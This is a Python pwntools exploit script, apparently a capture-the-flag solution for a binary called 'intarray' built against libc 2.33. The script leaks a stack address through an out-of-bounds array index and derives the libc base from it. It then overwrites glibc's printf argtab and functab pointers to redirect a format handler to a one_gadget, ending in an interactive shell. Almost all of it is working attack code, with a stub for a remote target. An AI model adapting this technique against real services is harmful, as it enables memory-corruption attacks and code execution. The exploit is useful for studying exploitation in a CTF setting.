from pwn import *
import time

#init

e = ELF('./intarray')
libc = ELF('./libc-2.33.so')

p = process(e.path)
#p = remote()

def chg(x, y):
    p.sendlineafter('?', 'y')
    p.sendlineafter(':', str(x))
    p.sendlineafter(':', str(y))

#vars

one_gadget = 0xcb5cd
printf_argtab_off = 0x1d91f8
printf_functab_off = 0x1d15c8

log.info('One gadget libc off: ' + hex(one_gadget))
log.info('Printf argtab libc off: ' + hex(printf_argtab_off))
log.info('Printf functab libc off: ' + hex(printf_functab_off))

#exploit

#init fake printf table

p.sendlineafter('?', str(0x80))

for i in range(0x80):
    p.sendlineafter(':', '-')

#leak stk and libc since thread stk is constant offset to libc

p.sendlineafter('?', 'y')
p.sendlineafter(':', str(71))

p.recvuntil('value ')
stk = int(p.recvuntil('.', drop = True)) - 712
libc_off = stk + 0x3a9c0#0x49c0

log.info('Stk adr: ' + hex(stk))
log.info('Libc off adr: ' + hex(libc_off))

#overwrite array pointer to printf_functab_off

chg(((libc_off + printf_argtab_off) - stk) // 0x8, (libc_off + printf_functab_off) - ord('d') * 0x8)
chg(((libc_off + printf_functab_off) - stk) // 0x8, libc_off + one_gadget)

#pray for flag

p.interactive()
